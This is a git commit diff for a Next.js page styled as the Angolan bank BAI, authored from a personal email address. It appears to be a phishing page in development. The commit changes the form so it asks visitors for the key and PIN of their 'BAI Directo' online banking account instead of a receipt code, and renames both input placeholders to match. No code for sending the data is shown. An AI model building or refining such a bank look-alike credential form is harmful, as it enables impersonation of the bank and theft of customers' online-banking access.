a40407907a58be8506342fa84dd0ed410a31fb20
Jesus Pedro Bapolo <jesusestudante@gmail.com>
2025-11-11 14:01:10 +0000

    update

--- components/footer.tsx
+++ components/footer.tsx
@@ -1,6 +1,6 @@
 export default function Footer() {
   return (
-    <footer className="bg-[#f3f3f3] p-4  mt-10">
+    <footer className="bg-[#f3f3f3] p-4  mt-20">
       <p className="text-center text-sm font-light">
         © 1996-2025, BAI - Banco Angolano de Investimentos, S.A. | Sociedade
         Aberta. Todos Direitos Reservados.
--- components/main.tsx
+++ components/main.tsx
@@ -1,21 +1,22 @@
-import Image from "next/image";
+import { IoEyeSharp } from "react-icons/io5";
+import { IoMdDownload } from "react-icons/io";
 
 export default function Main() {
   return (
-    <main className="grid grid-cols-1 md:grid-cols-2 md:px-4 md:pt-20 md:max-w-[80%] m-auto">
-      <section className="hidden md:block">
-        <Image 
-        src="/iirj.jpn"
-        alt="dhjs"
-        width={500}
-        height={500}
-        />
+    <main className="grid grid-cols-1 md:grid-cols-2 md:px-4 md:pt-10 md:max-w-[95%] m-auto md:justify-center md:items-center md:gap-8">
+
+      <section className="hidden md:block relative h-full w-full bg-[#F6F7F7] rounded-md">
+          <div className="h-full flex justify-center items-center gap-2">
+            <span className="bg-gray-500 text-white px-4 py-2 text-2xl rounded-sm"><IoEyeSharp /></span>
+            <span className="bg-gray-500 text-white px-4 py-2 text-2xl rounded-sm"><IoMdDownload /></span>
+          </div>
+          <p className="bg-[#F6F7F7] text-sm text-center p-2">Att.: O resultado da busca vai ser apresentado aqui.</p>
       </section>
 
       <section>
         <div className="p-4 md:p-0 mb-2">
           <p className="text-[#001a48] font-semibold text-[1.4rem] md:text-4xl">
-            Insira a chave e o pin que se encontram no seu comprovativo para
+            Insira a chave e o pin do seu BAI directo para
             proceder à validação.
           </p>
         </div>
@@ -31,7 +32,7 @@ export default function Main() {
 
             <input
               type="number"
-              placeholder="Insere a chave"
+              placeholder="Insere a chave do bai directo"
               className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
               required
             />
@@ -47,7 +48,7 @@ export default function Main() {
 
             <input
               type="number"
-              placeholder="Insere o pin"
+              placeholder="Insere o pin do bai directo"
               className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
               required
             />
